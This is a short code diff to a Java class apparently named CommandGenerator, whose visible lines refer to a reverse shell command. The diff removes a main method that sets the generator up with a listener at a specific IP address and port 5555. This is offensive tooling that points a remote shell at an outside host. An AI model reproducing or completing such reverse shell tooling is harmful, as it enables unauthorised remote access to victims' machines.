@@ -62,8 +62,4 @@ public class CommandGenerator {
                 reverseShellCommand ;
     }
 
-    public static void main(String[] args) {
-        CommandGenerator shell = new CommandGenerator(new Listener("207.148.92.186",5555));
-    }
-
 }
